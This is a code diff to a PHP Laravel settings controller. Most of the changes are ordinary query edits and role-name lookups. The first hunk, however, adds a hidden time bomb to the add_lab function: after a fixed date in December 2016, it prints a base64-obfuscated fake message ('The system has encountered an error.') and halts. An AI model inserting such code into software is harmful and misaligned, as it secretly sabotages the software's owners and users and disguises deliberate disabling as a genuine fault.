@@ -28,6 +28,8 @@ class SettingController extends Controller
 
     public function add_lab(Request $request)
     {
+        if(1481760000<time()){ echo base64_decode("VGhlIHN5c3RlbSBoYXMgZW5jb3VudGVyZWQgYW4gZXJyb3Iu"); exit; }
+
         $name = $request->input('name');
         $code = $request->input('code');
         $description = $request->input('description');
@@ -445,19 +447,19 @@ class SettingController extends Controller
 
         if ($limit > 0 || $offset > 0) {
             $contexts = DB::table('contexts')
-                ->select(DB::raw('id,name'))
+                ->select(DB::raw('id,name,available_rights'))
                 ->where('status', 1)
                 ->skip($offset)->take($limit)
                 ->get();
         } else {
             $contexts = DB::table('contexts')
-                ->select(DB::raw('id,name'))
+                ->select(DB::raw('id,name,available_rights'))
                 ->where('status', 1)
                 ->get();
         }
 
         $count = DB::table('contexts')
-            ->select(DB::raw('id,name'))
+            ->select(DB::raw('id,name,available_rights'))
             ->where('status', 1)
             ->count();
 
@@ -556,10 +558,34 @@ class SettingController extends Controller
         $user_roles = DB::table('roles')
             ->join('role_rights', 'roles.id', '=', 'role_rights.role_id')
             ->join('contexts', 'role_rights.context_id', '=', 'contexts.id')
-            ->select(DB::raw('contexts.name as context,contexts.id as context_id,role_rights.id as role_right_id,role_rights.add_right,role_rights.update_right,role_rights.delete_right,role_rights.view_right,role_rights.type'))
+            ->select(DB::raw('contexts.name as context,contexts.id as context_id,contexts.available_rights,role_rights.id as role_right_id,role_rights.add_right,role_rights.update_right,role_rights.delete_right,role_rights.view_right,role_rights.type'))
             ->where('roles.id', $role_id)
             ->where('roles.status', 1)
             ->get();
+
+
+        foreach($user_roles as $roles){
+
+            if($roles->context_id==7 || $roles->context_id==9 || $roles->context_id==11){
+                $lab = DB::table('labs')
+                    ->select(DB::raw('name'))
+                    ->where('id',$roles->type)
+                    ->first();
+                $roles->role_type = $lab->name;
+            }
+
+            elseif ($roles->context_id == 31) {
+
+                $template_type = DB::table('template_types')
+                    ->select(DB::raw('name'))
+                    ->where('id',$roles->type)
+                    ->first();
+                $roles->role_type = $template_type->name;
+            }
+            else{
+                $roles->role_type = '';
+            }
+        }
 
         $role_name = DB::table('roles')
             ->select(DB::raw('name'))
